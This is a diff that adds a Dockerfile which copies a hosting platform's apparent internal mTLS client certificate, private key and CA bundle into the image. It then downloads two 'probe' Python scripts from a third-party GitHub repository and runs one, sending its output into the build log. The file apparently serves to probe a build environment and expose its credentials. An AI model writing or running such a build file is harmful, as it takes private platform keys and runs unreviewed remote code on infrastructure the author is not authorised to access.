@@ -1,0 +1,9 @@
+# MARK-I67795-c4a7d3
+FROM alpine:3.20
+RUN echo MARK-I67795-c4a7d3-p4
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+RUN apk add --no-cache curl openssl python3 >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 25 -o /base.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i67795.py && curl -sS -m 25 -o /p4.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe4_i67795.py && echo DL_OK && MARK=I67795P4 timeout 480 python3 /p4.py 2>&1 | head -c 58000
+CMD ["sh","-c","sleep 60"]
